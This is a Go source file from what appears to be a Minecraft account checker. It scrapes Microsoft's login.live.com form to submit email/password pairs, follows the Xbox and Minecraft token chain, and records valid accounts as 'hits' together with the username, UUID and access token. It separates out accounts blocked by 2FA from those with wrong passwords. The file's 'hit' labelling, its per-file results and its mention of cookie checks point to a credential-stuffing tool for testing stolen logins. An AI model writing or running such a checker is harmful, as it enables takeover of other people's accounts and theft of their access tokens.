package auth

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"

	"golang.org/x/net/publicsuffix"
)

// Xbox client id used for email/password PPFT login (Mojang / Xbox app flow).
const passwordClientID = "000000004C12AE6F"

var (
	// Classic HTML (unescaped).
	ppftRe = regexp.MustCompile(`(?i)name="PPFT"[^>]*value="([^"]+)"`)
	// sFTTag:'<input ... value="..."/>' (single-quoted JS)
	ppftTagRe = regexp.MustCompile(`(?i)sFTTag:'[^']*value="([^"]+)"`)
	// Current login.live.com ServerData: "sFTTag":"<input ... value=\"TOKEN\"/>"
	ppftEscapedRe = regexp.MustCompile(`(?i)sFTTag"\s*:\s*".*?value=\\+"([^\\"]+)\\+"`)
	ppftEscapedRe2 = regexp.MustCompile(`(?i)name=\\+"PPFT\\+"[^>]*value=\\+"([^\\"]+)\\+"`)
	ppftJSONRe     = regexp.MustCompile(`(?i)"sFT"\s*:\s*"([^"]+)"`)
	urlPostRe      = regexp.MustCompile(`(?i)urlPost:\s*'([^']+)'`)
	urlPostRe2     = regexp.MustCompile(`(?i)urlPost:\s*"([^"]+)"`)
	urlPostJSON    = regexp.MustCompile(`(?i)"urlPost"\s*:\s*"([^"]+)"`)
)

// CheckPassword authenticates with Microsoft email/password, then the same
// Xbox → Minecraft chain as cookie checks.
func (c *Checker) CheckPassword(ctx context.Context, email, password, label string) Result {
	r := Result{File: label, Email: email, Password: password}
	msa, err := c.msaTokenPassword(ctx, email, password)
	if err != nil {
		return mapErr(r, err)
	}
	return c.finishFromMSA(ctx, r, msa)
}

func (c *Checker) finishFromMSA(ctx context.Context, r Result, msa string) Result {
	xbl, err := c.xboxAuth(ctx, msa)
	if err != nil {
		return mapErr(r, err)
	}
	xsts, uhs, err := c.xsts(ctx, xbl, "rp://api.minecraftservices.com/")
	if err != nil {
		return mapErr(r, err)
	}
	mcToken, err := c.mcLogin(ctx, uhs, xsts)
	if err != nil {
		return mapErr(r, err)
	}

	profile, err := c.mcProfile(ctx, mcToken)
	if err != nil {
		return mapErr(r, err)
	}
	if profile != nil {
		r.Status = StatusHit
		r.OwnsMinecraft = true
		r.Username = profile.Name
		r.UUID = profile.ID
		r.AccessToken = mcToken
		return r
	}

	products, err := c.entitlements(ctx, mcToken)
	if err != nil {
		return mapErr(r, err)
	}
	r.Products = products
	if ownsJava(products) {
		r.Status = StatusHit
		r.OwnsMinecraft = true
		r.AccessToken = mcToken
		r.Reason = "Owns Minecraft but no Java profile set"
		return r
	}
	r.Status = StatusNoMinecraft
	r.Reason = "Valid Microsoft/Xbox session, no Minecraft entitlement"
	return r
}

func (c *Checker) msaTokenPassword(ctx context.Context, email, password string) (string, error) {
	if c.Client == nil {
		return "", fmt.Errorf("nil HTTP client")
	}
	jar, err := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List})
	if err != nil {
		return "", err
	}
	client := *c.Client
	client.Jar = jar

	q := url.Values{
		"client_id":     {passwordClientID},
		"response_type": {"token"},
		"scope":         {scope},
		"redirect_uri":  {redirectURI},
		"display":       {"touch"},
		"locale":        {"en"},
	}
	startURL := authorizeURL + "?" + q.Encode()

	body, _, err := c.getFollowHTML(ctx, &client, startURL, "")
	if err != nil {
		return "", fmt.Errorf("MSA login page: %w", err)
	}
	ppft := extractPPFT(body)
	postURL := extractURLPost(body)
	if ppft == "" || postURL == "" {
		snip := strings.ReplaceAll(body, "\n", " ")
		if len(snip) > 160 {
			snip = snip[:160]
		}
		if strings.TrimSpace(body) == "" {
			snip = "(empty body — proxy/block?)"
		}
		return "", &authErr{
			msg: fmt.Sprintf("Could not parse Microsoft login form (ppft=%v urlPost=%v) %s",
				ppft != "", postURL != "", snip),
			status: StatusError,
		}
	}

	form := url.Values{
		"login":            {email},
		"loginfmt":         {email},
		"passwd":           {password},
		"PPFT":             {ppft},
		"type":             {"11"},
		"LoginOptions":     {"3"},
		"NewUser":          {"1"},
		"i13":              {"0"},
		"CookieDisclosure": {"0"},
		"IsFidoSupported":  {"1"},
		"isSignupPost":     {"0"},
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, postURL, strings.NewReader(form.Encode()))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Origin", "https://login.live.com")
	req.Header.Set("Referer", startURL)

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("MSA password login: %w", err)
	}
	location := resp.Header.Get("Location")
	loginBody, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	resp.Body.Close()

	if tok := extractAccessToken(location); tok != "" {
		return tok, nil
	}
	if tok := extractAccessToken(string(loginBody)); tok != "" {
		return tok, nil
	}

	// Follow redirect chain; token often lands in Location fragment/query.
	for hop := 0; hop < 12; hop++ {
		if location == "" {
			break
		}
		if tok := extractAccessToken(location); tok != "" {
			return tok, nil
		}
		next := resolveLoginURL(location)
		req, err = http.NewRequestWithContext(ctx, http.MethodGet, next, nil)
		if err != nil {
			return "", err
		}
		req.Header.Set("User-Agent", userAgent)
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		resp, err = client.Do(req)
		if err != nil {
			return "", fmt.Errorf("MSA login redirect: %w", err)
		}
		location = resp.Header.Get("Location")
		loginBody, _ = io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		resp.Body.Close()
		if tok := extractAccessToken(location); tok != "" {
			return tok, nil
		}
		if tok := extractAccessToken(string(loginBody)); tok != "" {
			return tok, nil
		}
	}

	lower := strings.ToLower(string(loginBody))
	switch {
	case strings.Contains(lower, "help us protect your account"),
		strings.Contains(lower, "prove your identity"),
		strings.Contains(lower, "enter the code"),
		strings.Contains(lower, "two-step"):
		return "", &authErr{msg: "2FA / identity challenge required", status: StatusInvalid}
	case strings.Contains(lower, "sign in to"),
		strings.Contains(lower, "your account or password is incorrect"),
		strings.Contains(lower, "incorrect account"),
		strings.Contains(lower, "too many times"):
		return "", &authErr{msg: "Invalid email/password", status: StatusInvalid}
	default:
		return "", &authErr{msg: "Microsoft password login failed", status: StatusInvalid}
	}
}

func (c *Checker) getFollowHTML(ctx context.Context, client *http.Client, rawURL, cookieHeader string) (body string, finalURL string, err error) {
	finalURL = rawURL
	for hop := 0; hop < 10; hop++ {
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, finalURL, nil)
		if err != nil {
			return "", "", err
		}
		req.Header.Set("User-Agent", userAgent)
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		if cookieHeader != "" {
			req.Header.Set("Cookie", cookieHeader)
		}
		resp, err := client.Do(req)
		if err != nil {
			return "", "", err
		}
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		resp.Body.Close()
		body = string(b)
		loc := resp.Header.Get("Location")
		if loc == "" || resp.StatusCode < 300 || resp.StatusCode >= 400 {
			return body, finalURL, nil
		}
		if tok := extractAccessToken(loc); tok != "" {
			// Unexpected early token; caller can also scrape body.
			return body + "\n" + loc, loc, nil
		}
		finalURL = resolveLoginURL(loc)
	}
	return body, finalURL, nil
}

func extractPPFT(body string) string {
	for _, re := range []*regexp.Regexp{ppftEscapedRe, ppftEscapedRe2, ppftRe, ppftTagRe, ppftJSONRe} {
		if m := re.FindStringSubmatch(body); len(m) == 2 && m[1] != "" {
			return m[1]
		}
	}
	return ""
}

func extractURLPost(body string) string {
	for _, re := range []*regexp.Regexp{urlPostJSON, urlPostRe, urlPostRe2} {
		if m := re.FindStringSubmatch(body); len(m) == 2 && m[1] != "" {
			u := m[1]
			u = strings.ReplaceAll(u, `\/`, "/")
			u = strings.ReplaceAll(u, `\u0026`, "&")
			u = strings.ReplaceAll(u, `&amp;`, "&")
			return u
		}
	}
	return ""
}

func resolveLoginURL(location string) string {
	if strings.HasPrefix(location, "http://") || strings.HasPrefix(location, "https://") {
		return location
	}
	base, err := url.Parse("https://login.live.com/")
	if err != nil {
		return location
	}
	ref, err := url.Parse(location)
	if err != nil {
		return location
	}
	return base.ResolveReference(ref).String()
}
